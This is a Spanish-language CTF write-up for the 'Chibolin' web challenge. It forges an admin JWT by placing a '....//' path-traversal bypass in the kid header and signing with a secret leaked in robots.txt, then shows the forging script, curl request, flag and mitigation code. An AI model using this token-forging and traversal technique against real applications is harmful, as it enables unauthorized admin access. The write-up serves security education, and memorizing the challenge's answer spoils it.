# Writeup: Chibolin CTF Challenge

## Información del Reto

| Campo | Valor |
|-------|-------|
| **Nombre** | Chibolin |
| **URL** | `http://20.81.206.3:23115/` |
| **Categoría** | Web |
| **Flag** | `comsocupc{L0GR4ST3_V3NCER_4L_K1DD0_G00D_J0B_dXu3o2}` |

### Pista Proporcionada
> "A veces debes dar un paso doble hacia atras para dar el paso final a la flag"
> 
> La flag esta en `/admin`

---

## Reconocimiento Inicial

### Tecnologías Identificadas

```http
Server: Werkzeug/3.1.4 Python/3.11.14
```

La aplicación es un servidor **Flask** (Python) con las siguientes funcionalidades:
- `/login` - Página de inicio de sesión
- `/register` - Página de registro
- `/welcome` - Panel de bienvenida (requiere autenticación)
- `/admin` - Panel de administración (requiere rol admin)

### Análisis del Flujo de Autenticación

1. **Registro de usuario**: POST a `/register` con `username` y `password`
2. **Inicio de sesión**: POST a `/login` → genera JWT en cookie
3. **Verificación de rol**: `/admin` requiere `role: admin` en el JWT

---

## Análisis del JWT

### Estructura del Token

Al iniciar sesión como `p0m3:123456`, se obtiene el siguiente JWT:

```
eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQua2V5IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InAwbTMiLCJyb2xlIjoidXNlciJ9.8eCv9uImWr4VypTxicU-KvVwFceXULOX37sDB15LMn4
```

**Header decodificado:**
```json
{
  "alg": "HS256",
  "kid": "default.key",
  "typ": "JWT"
}
```

**Payload decodificado:**
```json
{
  "username": "p0m3",
  "role": "user"
}
```

### Campo `kid` (Key ID)

El campo `kid` indica que el servidor lee la clave de firma desde un archivo llamado `default.key`. Este es un vector común para ataques de **path traversal** en JWT.

---

## Descubrimiento de la Clave Secreta

### Archivo robots.txt

Durante la enumeración, se encontró un archivo `robots.txt` con contenido inusual:

```bash
curl -s http://20.81.206.3:23115/robots.txt
```

**Respuesta:**
```
lavidaesunacausa
```

Este contenido de 16 bytes exactos (sin newline) parecía ser una clave secreta que podría usarse para firmar JWTs.

### Verificación

Intenté verificar si `lavidaesunacausa` era la clave del JWT original:

```python
import hmac
import hashlib

jwt = "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQua2V5IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InAwbTMiLCJyb2xlIjoidXNlciJ9"
test_key = b'lavidaesunacausa'

expected_sig = hmac.new(test_key, jwt.encode(), hashlib.sha256).digest()
# La firma NO coincidía con el JWT original
```

**Conclusión**: La clave `lavidaesunacausa` NO es la clave por defecto del servidor, pero podría usarse mediante **path traversal** en el campo `kid`.

---

## Explotación: Path Traversal en JWT kid

### Intentos Fallidos

Probé múltiples variantes de path traversal sin éxito:

| Path Probado | Resultado |
|--------------|-----------|
| `../static/robots.txt` | 302 (redirect) |
| `../../static/robots.txt` | 302 (redirect) |
| `../../../static/robots.txt` | 302 (redirect) |
| `..%2f..%2fstatic%2frobots.txt` | 302 (redirect) |
| `/app/static/robots.txt` | 302 (redirect) |

### El Bypass: "Paso Doble Hacia Atrás"

La pista decía **"paso doble hacia atrás"**. Después de muchos intentos, descubrí que el servidor **sanitiza** `../` pero tiene una vulnerabilidad en su lógica de filtrado.

**El path que funcionó:**
```
....//static/robots.txt
```

### ¿Por qué funciona `....//`?

El servidor probablemente usa una lógica como:

```python
kid = kid.replace("../", "")
```

Cuando el input es `....//`:

1. **Input**: `....//static/robots.txt`
2. El servidor busca `../` y lo reemplaza
3. `....//` → después del reemplazo se convierte en `../`
4. **Resultado final**: `../static/robots.txt`

Esto es un bypass clásico de sanitización de path traversal.

---

## Forjando el JWT Malicioso

### Script de Explotación

```python
import base64
import hmac
import hashlib
import json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Clave obtenida de robots.txt
secret = b'lavidaesunacausa'

# Header con path traversal bypass
header = {
    'alg': 'HS256',
    'kid': '....//static/robots.txt',  # ← bypass de sanitización
    'typ': 'JWT'
}

# Payload con rol admin
payload = {
    'username': 'admin',
    'role': 'admin'
}

# Codificar header y payload
header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))

# Firmar con HMAC-SHA256
message = f'{header_b64}.{payload_b64}'
signature = hmac.new(secret, message.encode(), hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

# JWT final
jwt_token = f'{message}.{signature_b64}'
print(f"JWT: {jwt_token}")
```

### JWT Generado

```
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vL3N0YXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.itARQeJ6FTYvwcLsNNkumTpuUH8TyC5RcQiHFoLDSRM
```

---

## Obtención de la Flag

### Comando Final

```bash
curl -b "jwt=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vL3N0YXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.itARQeJ6FTYvwcLsNNkumTpuUH8TyC5RcQiHFoLDSRM" \
    http://20.81.206.3:23115/admin
```

### Respuesta del Servidor

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Chibolin</title>
  <link rel="stylesheet" href="../static/css/neon.css">
</head>
<body>
  <div class="container">
    <h1 class="neon-title">ChibolinCorp</h1>
    
<h2 class="neon">ADMIN PANEL</h2>
<pre class="flag">comsocupc{L0GR4ST3_V3NCER_4L_K1DD0_G00D_J0B_dXu3o2}</pre>

  </div>
</body>
</html>
```

---

## Flag

```
comsocupc{L0GR4ST3_V3NCER_4L_K1DD0_G00D_J0B_dXu3o2}
```

---

## Resumen de la Vulnerabilidad

```mermaid
flowchart TD
    A[Usuario envía JWT con kid malicioso] --> B{Servidor sanitiza kid}
    B -->|Remueve ../| C["....// → ../"]
    C --> D[Path resultante: ../static/robots.txt]
    D --> E[Lee archivo robots.txt]
    E --> F[Usa 'lavidaesunacausa' como clave]
    F --> G[Verifica firma del JWT]
    G --> H[JWT válido con role: admin]
    H --> I[Acceso a /admin]
    I --> J[🚩 FLAG]
```

## Lecciones Aprendidas

1. **Sanitización insuficiente**: Reemplazar `../` una sola vez no es seguro. Se debe usar sanitización recursiva o normalización de paths con `os.path.normpath()` + validación.

2. **Archivos sensibles expuestos**: `robots.txt` contenía información sensible (la clave secreta).

3. **JWT kid injection**: El campo `kid` en JWT no debe permitir rutas arbitrarias. Debe validarse contra una lista blanca de claves permitidas.

### Mitigación Recomendada

```python
import os

def get_key_path(kid):
    # Validar que kid solo contenga caracteres alfanuméricos
    if not kid.replace('.', '').replace('_', '').isalnum():
        raise ValueError("Invalid key id")
    
    base_path = "/app/keys"
    full_path = os.path.normpath(os.path.join(base_path, kid))
    
    # Verificar que el path resultante esté dentro del directorio permitido
    if not full_path.startswith(base_path):
        raise ValueError("Path traversal detected")
    
    return full_path
```

---

**Autor**: p0mb3r0
**Fecha**: 2025-12-21
